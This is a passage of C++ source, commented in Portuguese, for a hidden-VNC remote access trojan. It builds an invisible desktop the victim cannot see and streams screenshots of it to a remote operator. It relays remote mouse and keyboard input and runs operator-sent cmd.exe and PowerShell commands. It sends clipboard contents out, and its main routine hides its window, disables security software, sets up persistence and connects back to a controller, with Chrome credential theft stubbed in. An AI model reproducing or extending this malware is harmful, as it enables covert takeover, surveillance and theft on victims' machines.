        essentialSi.cb = sizeof(essentialSi);
        essentialSi.lpDesktop = (LPSTR)ghostDesktopName.c_str();
        essentialSi.dwFlags = STARTF_USESHOWWINDOW;
        essentialSi.wShowWindow = SW_SHOW;
        
        BOOL essentialResult = CreateProcessA(
            essentialApps[i], NULL, NULL, NULL, FALSE,
            CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP,
            NULL, NULL, &essentialSi, &essentialPi
        );
        
        if (essentialResult) {
            ghostProcs.push_back(essentialPi.dwProcessId);
            duplicatedApps++;
            CloseHandle(essentialPi.hProcess);
            CloseHandle(essentialPi.hThread);
        }
        Sleep(500);
    }
    
    std::ofstream final_log("C:\\ProgramData\\hvnc_duplication_complete.log", std::ios::app);
    final_log << "HVNC REAL: DUPLICAÇÃO COMPLETA DA SESSÃO: " << duplicatedApps << "/" << currentSessionWindows.size() 
             << " APLICAÇÕES DUPLICADAS NO DESKTOP FANTASMA INVISÍVEL"
             << " | EXPLORER + APLICAÇÕES ESSENCIAIS CRIADAS"
             << " | VÍTIMA NÃO VÊ NADA DO QUE ACONTECE NO HVNC"
             << " [" << time(0) << "]\n";
    final_log.close();
}

// CORREÇÃO CRÍTICA: Desktop fantasma com DUPLICAÇÃO DA SESSÃO ATUAL (HVNC REAL)
HDESK SetupGhostDesktop(std::string deskName="hiddenvnc") {
    // CORREÇÃO: Inicializa eventos de sincronização
    hDesktopReadyEvent = CreateEventA(NULL, TRUE, FALSE, "HVNCDesktopReady");
    hCaptureReadyEvent = CreateEventA(NULL, TRUE, FALSE, "HVNCCaptureReady");
    
    if (!hDesktopReadyEvent || !hCaptureReadyEvent) {
        std::ofstream error_log("hvnc_sync_error.log", std::ios::app);
        error_log << "Failed to create synchronization events: " << GetLastError() << " [" << time(0) << "]\n";
        error_log.close();
    }
    
    // CORREÇÃO: Cria desktop invisível com nome único e permissões completas
    std::string uniqueDeskName = deskName + "_" + std::to_string(GetTickCount());
    ghostDeskName = uniqueDeskName; // Atualiza nome global
    
    HDESK hDesk = CreateDesktopA(
        uniqueDeskName.c_str(), 
        NULL, NULL, 0,
        DESKTOP_READOBJECTS | DESKTOP_CREATEWINDOW | DESKTOP_CREATEMENU |
        DESKTOP_HOOKCONTROL | DESKTOP_JOURNALRECORD | DESKTOP_JOURNALPLAYBACK |
        DESKTOP_ENUMERATE | DESKTOP_WRITEOBJECTS | DESKTOP_SWITCHDESKTOP,
        NULL
    );
    if (!hDesk) {
        std::ofstream error_log("hvnc_desktop_error.log", std::ios::app);
        error_log << "Failed to create ghost desktop: " << GetLastError() << " [" << time(0) << "]\n";
        error_log.close();
        ExitProcess(8);
    }
    
    std::ofstream success_log("hvnc_desktop_created.log", std::ios::app);
    success_log << "Ghost desktop created successfully: " << uniqueDeskName << " [" << time(0) << "]\n";
    success_log.close();
    
    // HVNC REAL: DUPLICA A SESSÃO ATUAL DO USUÁRIO PARA O DESKTOP FANTASMA
    DuplicateCurrentSessionToGhost(uniqueDeskName);
    
    // CORREÇÃO CRÍTICA: Aguarda as aplicações duplicadas carregarem
    Sleep(5000);
    
    // Log de sucesso final
     std::ofstream desktop_success_log("hvnc_desktop_success.log", std::ios::app);
     desktop_success_log << "Ghost desktop setup complete: " << uniqueDeskName 
                        << " with session duplication [" << time(0) << "]\n";
     desktop_success_log.close();
     
     // CORREÇÃO CRÍTICA: Aguarda as aplicações carregarem completamente
     Sleep(3000);
     
     // CORREÇÃO CRÍTICA: Sinaliza que o desktop está pronto para captura
     isGhostDesktopReady = true;
     if (hDesktopReadyEvent) {
         SetEvent(hDesktopReadyEvent);
         std::ofstream sync_log("C:\\ProgramData\\hvnc_desktop_ready.log", std::ios::app);
         sync_log << "Desktop ready event signaled for: " << uniqueDeskName << " [" << time(0) << "]\n";
         sync_log.close();
     }
     
     return hDesk;
}
// CORREÇÃO CRÍTICA: Captura HVNC otimizada com streaming eficiente
void CaptureGhostDesktopAndStream(SOCKET sock, HDESK hDesk) {
    // Log de início da thread de captura
    std::ofstream thread_start_log("C:\\ProgramData\\hvnc_capture_thread_started.log", std::ios::app);
    thread_start_log << "THREAD CAPTURA INICIADA - Socket: " << sock << " Desktop: " << hDesk << " [" << time(0) << "]\n";
    thread_start_log.close();
    
    // OTIMIZAÇÃO: Inicialização rápida sem logs excessivos
    if (hDesktopReadyEvent) {
        WaitForSingleObject(hDesktopReadyEvent, 5000); // Reduzido para 5s
    } else {
        Sleep(2000); // Reduzido para 2s
    }
    
    // OTIMIZAÇÃO CRÍTICA: FPS baixo para reduzir CPU drasticamente
    DWORD lastCaptureTime = GetTickCount();
    const DWORD MIN_FRAME_INTERVAL = 1000; // 1 FPS para máxima eficiência
    const DWORD MAX_FRAME_INTERVAL = 3000; // 3s quando idle
    int consecutiveErrors = 0;
    bool adaptiveMode = false;
    
    // Buffer reutilizável para reduzir alocações
    std::vector<BYTE> lastFrame;
    
    while(keepAlive) {
        DWORD currentTime = GetTickCount();
        DWORD timeSinceLastCapture = currentTime - lastCaptureTime;
        
        // OTIMIZAÇÃO: Intervalo adaptativo baseado em erros
        DWORD requiredInterval = adaptiveMode ? MAX_FRAME_INTERVAL : MIN_FRAME_INTERVAL;
        if (timeSinceLastCapture < requiredInterval) {
            Sleep(100); // Sleep curto para não bloquear
            continue;
        }
        
        // OTIMIZAÇÃO: Resolução ainda menor para máxima performance
        int w = 800, h = 600; // Resolução mínima funcional
        
        // CORREÇÃO CRÍTICA: Captura sem mutex para evitar bloqueios
        auto jpegVec = CaptureGhostDesktopJPEG(hDesk, w, h, 40); // Qualidade baixa
        
        lastCaptureTime = GetTickCount();
        
        // OTIMIZAÇÃO: Validação rápida sem logs excessivos
        if (jpegVec.size() < 500 || jpegVec.size() > 500000) { // Tamanho inválido
            consecutiveErrors++;
            if (consecutiveErrors > 3) {
                adaptiveMode = true; // Entra em modo adaptativo rapidamente
            }
            Sleep(200);
            continue;
        }
        
        // Verifica assinatura JPEG básica
        if (jpegVec.size() < 2 || jpegVec[0] != 0xFF || jpegVec[1] != 0xD8) {
            consecutiveErrors++;
            Sleep(200);
            continue;
        }
        
        // OTIMIZAÇÃO: Detecção de frame duplicado para economizar banda
        if (jpegVec == lastFrame) {
            Sleep(500); // Frame igual, aguarda mais
            continue;
        }
        lastFrame = jpegVec;
        
        // Reset de erros em caso de sucesso
        if (consecutiveErrors > 0) {
            consecutiveErrors = 0;
            adaptiveMode = false;
        }
        
        // CORREÇÃO CRÍTICA: Sincronização do socket com mutex
        {
            std::lock_guard<std::mutex> lock(socketMutex);
            size_t sent = 0;
            bool sendSuccess = true;
            
            // Log de início do envio
            std::ofstream send_log("C:\\ProgramData\\hvnc_send_start.log", std::ios::app);
            send_log << "INICIANDO ENVIO IMG - Tamanho: " << jpegVec.size() << " bytes [" << time(0) << "]\n";
            send_log.close();
            
            // Envia header com tamanho da imagem
            std::string header = "IMG:" + std::to_string(jpegVec.size()) + "\n";
            int headerResult = send(sock, header.c_str(), header.length(), 0);
            if (headerResult == SOCKET_ERROR) {
                std::ofstream error_log("C:\\ProgramData\\hvnc_send_header_error.log", std::ios::app);
                error_log << "ERRO ENVIO HEADER - WSAError: " << WSAGetLastError() << " [" << time(0) << "]\n";
                error_log.close();
                break;
            }
            
            // Log de header enviado
            std::ofstream header_log("C:\\ProgramData\\hvnc_send_header.log", std::ios::app);
            header_log << "HEADER ENVIADO - " << header << " Bytes: " << headerResult << " [" << time(0) << "]\n";
            header_log.close();
            
            // Envia dados em chunks menores para evitar bloqueios
            const int CHUNK_SIZE = 4096; // Chunks menores
            while(sent < jpegVec.size() && sendSuccess) {
                int chunk = std::min(CHUNK_SIZE, (int)(jpegVec.size() - sent));
                int result = send(sock, (char*)jpegVec.data() + sent, chunk, 0);
                if (result == SOCKET_ERROR || result == 0) {
                    std::ofstream chunk_error_log("C:\\ProgramData\\hvnc_send_chunk_error.log", std::ios::app);
                    chunk_error_log << "ERRO ENVIO CHUNK - Sent: " << sent << "/" << jpegVec.size() 
                                   << " WSAError: " << WSAGetLastError() << " [" << time(0) << "]\n";
                    chunk_error_log.close();
                    sendSuccess = false;
                    break;
                }
                sent += result;
                
                // Micro-sleep para não sobrecarregar a rede
                if (sent < jpegVec.size()) {
                    Sleep(1);
                }
            }
            
            if (!sendSuccess) {
                break; // Sai do loop se houver erro de envio
            }
            
            // Log de envio completo
            std::ofstream complete_log("C:\\ProgramData\\hvnc_send_complete.log", std::ios::app);
            complete_log << "ENVIO COMPLETO - Total: " << sent << " bytes [" << time(0) << "]\n";
            complete_log.close();
        } // Fim do lock do mutex
        
        // OTIMIZAÇÃO CRÍTICA: Sleep inteligente baseado no estado
        Sleep(adaptiveMode ? 2000 : 800); // Sleep maior para reduzir CPU
    }
}
// Input ghost robusto
void GhostInputHandler(SOCKET sock, HDESK hDesk) {
    // CORREÇÃO CRÍTICA: Configuração robusta do desktop da thread de input
    HDESK hOriginalDesktop = GetThreadDesktop(GetCurrentThreadId());
    
    // Log de início da configuração
    std::ofstream init_log("C:\\ProgramData\\hvnc_input_thread_init.log", std::ios::app);
    init_log << "Input thread starting configuration [" << time(0) << "]\n";
    init_log.close();
    
    // Não configura o desktop permanentemente aqui, pois precisa alternar dinamicamente
    // A configuração será feita temporariamente durante cada operação de input
    
    char buffer[16384];
    while(keepAlive) {
        int len = recv(sock, buffer, sizeof(buffer), 0);
        if (len <= 0) continue;
        
        std::string cmd(buffer,len);
        
        // Novos comandos de mouse do painel web
        if(cmd.substr(0,11)=="MOUSE_MOVE:") {
            int x = 0, y = 0;
            sscanf(cmd.c_str(),"MOUSE_MOVE:%d:%d",&x,&y);
            
            HDESK hCurrentDesktop = GetThreadDesktop(GetCurrentThreadId());
            if (SetThreadDesktop(hDesk)) {
                SetCursorPos(x,y);
                SetThreadDesktop(hCurrentDesktop);
            }
        }
        else if(cmd.substr(0,11)=="MOUSE_DOWN:") {
            int x = 0, y = 0;
            char button[10] = "left";
            sscanf(cmd.c_str(),"MOUSE_DOWN:%d:%d:%9s",&x,&y,button);
            
            HDESK hCurrentDesktop = GetThreadDesktop(GetCurrentThreadId());
            if (SetThreadDesktop(hDesk)) {
                SetCursorPos(x,y);
                if (strcmp(button, "left") == 0) {
                    mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
                } else if (strcmp(button, "right") == 0) {
                    mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
                } else if (strcmp(button, "middle") == 0) {
                    mouse_event(MOUSEEVENTF_MIDDLEDOWN,0,0,0,0);
                }
                SetThreadDesktop(hCurrentDesktop);
            }
        }
        else if(cmd.substr(0,9)=="MOUSE_UP:") {
            int x = 0, y = 0;
            char button[10] = "left";
            sscanf(cmd.c_str(),"MOUSE_UP:%d:%d:%9s",&x,&y,button);
            
            HDESK hCurrentDesktop = GetThreadDesktop(GetCurrentThreadId());
            if (SetThreadDesktop(hDesk)) {
                SetCursorPos(x,y);
                if (strcmp(button, "left") == 0) {
                    mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
                } else if (strcmp(button, "right") == 0) {
                    mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
                } else if (strcmp(button, "middle") == 0) {
                    mouse_event(MOUSEEVENTF_MIDDLEUP,0,0,0,0);
                }
                SetThreadDesktop(hCurrentDesktop);
            }
        }
        else if(cmd.substr(0,12)=="MOUSE_WHEEL:") {
            int x = 0, y = 0, delta = 0;
            sscanf(cmd.c_str(),"MOUSE_WHEEL:%d:%d:%d",&x,&y,&delta);
            
            HDESK hCurrentDesktop = GetThreadDesktop(GetCurrentThreadId());
            if (SetThreadDesktop(hDesk)) {
                SetCursorPos(x,y);
                mouse_event(MOUSEEVENTF_WHEEL,0,0,delta,0);
                SetThreadDesktop(hCurrentDesktop);
            }
        }
        // Novos comandos de teclado do painel web
        else if(cmd.substr(0,9)=="KEY_DOWN:") {
            int keyCode = 0;
            char key[32] = "";
            sscanf(cmd.c_str(),"KEY_DOWN:%d:%31s",&keyCode,key);
            
            HDESK hCurrentDesktop = GetThreadDesktop(GetCurrentThreadId());
            if (SetThreadDesktop(hDesk)) {
                INPUT input={0};
                input.type=INPUT_KEYBOARD;
                input.ki.wVk=keyCode;
                SendInput(1,&input,sizeof(input));
                SetThreadDesktop(hCurrentDesktop);
            }
        }
        else if(cmd.substr(0,7)=="KEY_UP:") {
            int keyCode = 0;
            char key[32] = "";
            sscanf(cmd.c_str(),"KEY_UP:%d:%31s",&keyCode,key);
            
            HDESK hCurrentDesktop = GetThreadDesktop(GetCurrentThreadId());
            if (SetThreadDesktop(hDesk)) {
                INPUT input={0};
                input.type=INPUT_KEYBOARD;
                input.ki.wVk=keyCode;
                input.ki.dwFlags = KEYEVENTF_KEYUP;
                SendInput(1,&input,sizeof(input));
                SetThreadDesktop(hCurrentDesktop);
            }
        }
        // Comandos antigos mantidos para compatibilidade
        else if(cmd.substr(0,6)=="MOUSE:") {
            int x = 0, y = 0; char click[10] = "NONE";
            sscanf(cmd.c_str(),"MOUSE:%d,%d,%9s",&x,&y,click);
            
            HDESK hCurrentDesktop = GetThreadDesktop(GetCurrentThreadId());
            if (SetThreadDesktop(hDesk)) {
                SetCursorPos(x,y);
                
                if (strstr(click, "LCLICK")) {
                    mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
                    Sleep(10);
                    mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
                }
                if (strstr(click, "RCLICK")) {
                    mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
                    Sleep(10);
                    mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
                }
                if (strstr(click, "DCLICK")) {
                    mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
                    Sleep(10);
                    mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
                    Sleep(10);
                    mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
                    Sleep(10);
                    mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
                }
                
                SetThreadDesktop(hCurrentDesktop);
            }
        }
        else if(cmd.substr(0,9)=="KEYBOARD:"){
            int vk = atoi(cmd.substr(9).c_str());
            
            HDESK hCurrentDesktop = GetThreadDesktop(GetCurrentThreadId());
            if (SetThreadDesktop(hDesk)) {
                INPUT input={0}; 
                input.type=INPUT_KEYBOARD; 
                input.ki.wVk=vk;
                SendInput(1,&input,sizeof(input));
                
                input.ki.dwFlags = KEYEVENTF_KEYUP;
                SendInput(1,&input,sizeof(input));
                
                SetThreadDesktop(hCurrentDesktop);
            }
        }
        else if(cmd=="SWITCH_DESKTOP:") {
            // CORREÇÃO CRÍTICA: Alterna entre desktop fantasma e principal sem afetar usuário
            static bool onGhostDesktop = false;  // Começa no desktop principal
            
            if(onGhostDesktop) {
                // Volta para o desktop principal (apenas para esta thread)
                HDESK hDefaultDesktop = OpenDesktopA("default", 0, FALSE, DESKTOP_SWITCHDESKTOP);
                if (hDefaultDesktop) {
                    SetThreadDesktop(hDefaultDesktop);
                    CloseDesktop(hDefaultDesktop);
                    onGhostDesktop = false;
                    
                    // Log da troca
                    std::ofstream log("C:\\ProgramData\\hvnc_switch_to_main.log", std::ios::app);
                    log << "Switched to main desktop [" << time(0) << "]\n";
                    log.close();
                }
            } else {
                // Vai para o desktop fantasma (apenas para esta thread)
                if (SetThreadDesktop(hDesk)) {
                    onGhostDesktop = true;
                    
                    // Log da troca
                    std::ofstream log("C:\\ProgramData\\hvnc_switch_to_ghost.log", std::ios::app);
                    log << "Switched to ghost desktop [" << time(0) << "]\n";
                    log.close();
                }
            }
        }
        memset(buffer,0,sizeof(buffer));
    }
}
// HVNC comandos, shell, stealer, filemanager turbo
void GhostCommandHandler(SOCKET sock, HDESK hDesk) {
    // CORREÇÃO CRÍTICA: Configuração robusta do desktop da thread
    HDESK hOriginalDesktop = GetThreadDesktop(GetCurrentThreadId());
    
    if (!SetThreadDesktop(hDesk)) {
        std::ofstream error_log("C:\\ProgramData\\hvnc_cmd_thread_desktop_error.log", std::ios::app);
        error_log << "Failed to set command thread desktop: " << GetLastError() << " [" << time(0) << "]\n";
        error_log.close();
        return; // Sai se não conseguir configurar o desktop
    }
    
    // Log de confirmação da configuração
    char currentDesktopName[256];
    DWORD nameLen = sizeof(currentDesktopName);
    if (GetUserObjectInformationA(GetThreadDesktop(GetCurrentThreadId()), UOI_NAME, currentDesktopName, nameLen, &nameLen)) {
        std::ofstream config_log("C:\\ProgramData\\hvnc_cmd_thread_configured.log", std::ios::app);
        config_log << "Command thread configured for desktop: " << currentDesktopName << " [" << time(0) << "]\n";
        config_log.close();
    }
    
    char buffer[16384];
    while(keepAlive) {
        int len = recv(sock, buffer, sizeof(buffer), 0);
        if (len <= 0) continue;
        
        std::string cmd(buffer,len);
        if(cmd.substr(0,4)=="CMD:") {
            std::string command = cmd.substr(4);
            
            // CORREÇÃO CRÍTICA: Executa comando no desktop fantasma com nome correto
            STARTUPINFOA si = {0};
            PROCESS_INFORMATION pi = {0};
            si.cb = sizeof(si);
            
            // Usa o nome do desktop fantasma criado dinamicamente
            char desktopName[256];
            DWORD desktopNameLen = sizeof(desktopName);
            if (GetUserObjectInformationA(hDesk, UOI_NAME, desktopName, desktopNameLen, &desktopNameLen)) {
                si.lpDesktop = desktopName;
            } else {
                si.lpDesktop = (LPSTR)"hiddenvnc";  // Fallback
            }
            
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_SHOW;  // Visível no desktop fantasma
            
            std::string fullCmd = "cmd.exe /c " + command;
            if (CreateProcessA(NULL, (LPSTR)fullCmd.c_str(), NULL, NULL, FALSE, 
                              CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP, NULL, NULL, &si, &pi)) {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
        }
        else if(cmd.substr(0,3)=="PS:"){
            std::string psCommand = cmd.substr(3);
            
            // CORREÇÃO CRÍTICA: Executa PowerShell no desktop fantasma
            STARTUPINFOA si = {0};
            PROCESS_INFORMATION pi = {0};
            si.cb = sizeof(si);
            
            // Usa o nome do desktop fantasma criado dinamicamente
            char desktopName[256];
            DWORD desktopNameLen = sizeof(desktopName);
            if (GetUserObjectInformationA(hDesk, UOI_NAME, desktopName, desktopNameLen, &desktopNameLen)) {
                si.lpDesktop = desktopName;
            } else {
                si.lpDesktop = (LPSTR)"hiddenvnc";  // Fallback
            }
            
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_SHOW;  // Visível no desktop fantasma
            
            std::string fullCmd = "powershell.exe -Command \"" + psCommand + "\"";
            if (CreateProcessA(NULL, (LPSTR)fullCmd.c_str(), NULL, NULL, FALSE, 
                              CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP, NULL, NULL, &si, &pi)) {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
        }
        else if(cmd=="CHROME:"){
            // Steal Chrome no desktop fantasma
            // StealChrome(sock, "all"); // Comentado temporariamente para compilação
        }
        else if(cmd=="CLIPINJECT:"){
            // clipboard inject handler aqui robusto
            // TODO: Implementar inject de clipboard
        }
        else if(cmd=="FILEMANAGER:"){
            // filemanager completo aqui
            // TODO: Implementar file manager
        }
        memset(buffer,0,sizeof(buffer));
    }
}
// Stealth/ghost clipboard turbo
void SetClipboardListener(SOCKET sock) {
    HWND hwnd = GetConsoleWindow();
    AddClipboardFormatListener(hwnd);
    while(keepAlive){
        if(OpenClipboard(hwnd)){
            HANDLE hData = GetClipboardData(CF_TEXT);
            if(hData){
                char* clip = (char*)GlobalLock(hData);
                if(clip){
                    // CORREÇÃO CRÍTICA: Sincronização do socket com mutex
                    {
                        std::lock_guard<std::mutex> lock(socketMutex);
                        send(sock, "CLIP:", 5, 0);
                        send(sock, clip, strlen(clip), 0);
                    }
                    GlobalUnlock(hData);
                }
            }
            CloseClipboard();
        }
        Sleep(30000); // CORREÇÃO: Reduzido para 30s para não interferir com IMG:
    }
}
// Hooks para ghost desktop
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam){
    MSLLHOOKSTRUCT* ms = (MSLLHOOKSTRUCT*)lParam;
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
    KBDLLHOOKSTRUCT* ks = (KBDLLHOOKSTRUCT*)lParam;
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
    SetMutex();
    // CORREÇÃO TEMPORÁRIA: Desabilitando verificações anti-debug/VM para teste
    // if(IsDebuggerPresentCustom()||IsVM()) ExitProcess(1);
    KillDefenders();
    AntiEDR_Block();
    TryPersist();
    WSADATA wsa; WSAStartup(MAKEWORD(2,2),&wsa);
    gSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    std::string sessionToken = GenSessionToken();
    ConnectReverse(gSock, sessionToken);
    
    // CORREÇÃO CRÍTICA: Inicializa eventos de sincronização ANTES de tudo
    hDesktopReadyEvent = CreateEventA(NULL, TRUE, FALSE, NULL);  // Manual reset, initially non-signaled
    hCaptureReadyEvent = CreateEventA(NULL, TRUE, FALSE, NULL);  // Manual reset, initially non-signaled
    
    if (!hDesktopReadyEvent || !hCaptureReadyEvent) {
        std::ofstream error_log("hvnc_event_creation_error.log", std::ios::app);
        error_log << "Failed to create synchronization events [" << time(0) << "]\n";
        error_log.close();
        ExitProcess(1);
    }
    
    // CORREÇÃO CRÍTICA: Inicializa GDI+ usando variável global
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    Gdiplus::Status status = Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    if (status != Gdiplus::Ok) {
        std::ofstream error_log("hvnc_gdiplus_error.log", std::ios::app);
        error_log << "GDI+ startup failed: " << status << " [" << time(0) << "]\n";
        error_log.close();
        ExitProcess(1);
    }
    
    // CORREÇÃO CRÍTICA: Desktop ghost HVNC com sincronização
    std::ofstream init_log("hvnc_init_start.log", std::ios::app);
    init_log << "Starting ghost desktop setup [" << time(0) << "]\n";
    init_log.close();
    
    hGhostDesk = SetupGhostDesktop(ghostDeskName); // Reabilitado para HVNC real
    
    if (!hGhostDesk) {
        std::ofstream error_log("hvnc_desktop_creation_failed.log", std::ios::app);
        error_log << "Ghost desktop creation failed [" << time(0) << "]\n";
        error_log.close();
        ExitProcess(1);
    }
    
    // Inicia hooks robustos
    HHOOK mHook=SetWindowsHookEx(WH_MOUSE_LL,MouseProc,NULL,0);
    HHOOK kHook=SetWindowsHookEx(WH_KEYBOARD_LL,KeyboardProc,NULL,0);
    
    // CORREÇÃO CRÍTICA: Logs detalhados para debug
    std::ofstream debug_log("C:\\ProgramData\\hvnc_debug_main.log", std::ios::app);
    debug_log << "PONTO 1: Antes de criar threads - Socket: " << gSock << " Desktop: " << hGhostDesk << " [" << time(0) << "]\n";
    debug_log.close();
    
    // Log antes de criar as threads
    std::ofstream threads_log("C:\\ProgramData\\hvnc_creating_threads.log", std::ios::app);
    threads_log << "Iniciando criação das threads - Socket: " << gSock << " Desktop: " << hGhostDesk << " [" << time(0) << "]\n";
    threads_log.close();
    
    // CORREÇÃO CRÍTICA: Inicia threads na ordem correta com sincronização
    std::ofstream debug_log2("C:\\ProgramData\\hvnc_debug_main.log", std::ios::app);
    debug_log2 << "PONTO 2: Criando thread de captura [" << time(0) << "]\n";
    debug_log2.close();
    
    std::thread streamThread(CaptureGhostDesktopAndStream, gSock, hGhostDesk);
    
    // Log após criar thread de captura
    std::ofstream stream_thread_log("C:\\ProgramData\\hvnc_stream_thread_created.log", std::ios::app);
    stream_thread_log << "Thread de captura criada [" << time(0) << "]\n";
    stream_thread_log.close();
    
    std::ofstream debug_log3("C:\\ProgramData\\hvnc_debug_main.log", std::ios::app);
    debug_log3 << "PONTO 3: Criando outras threads [" << time(0) << "]\n";
    debug_log3.close();
    
    std::thread inputThread(GhostInputHandler, gSock, hGhostDesk);
    std::thread cmdThread(GhostCommandHandler, gSock, hGhostDesk);
    std::thread clipThread(SetClipboardListener, gSock);
    streamThread.join();
    inputThread.join();
    cmdThread.join();
    clipThread.join();
    UnhookWindowsHookEx(mHook);
    UnhookWindowsHookEx(kHook);
    
    // CORREÇÃO CRÍTICA: Limpeza adequada dos recursos
    if (hDesktopReadyEvent) {
        CloseHandle(hDesktopReadyEvent);
        hDesktopReadyEvent = NULL;
    }
    if (hCaptureReadyEvent) {
        CloseHandle(hCaptureReadyEvent);
        hCaptureReadyEvent = NULL;
    }
    if (hGhostDesk) {
        CloseDesktop(hGhostDesk);
        hGhostDesk = NULL;
    }
    
    Gdiplus::GdiplusShutdown(gdiplusToken);
    closesocket(gSock);
    WSACleanup();
    // Finalização turbo/log
    std::ofstream endlog("C:\\ProgramData\\hvnc_exit.log", std::ios::app);
    endlog << "Sessão finalizada [" << time(0) << "]\n"; endlog.close();
    return 0;
}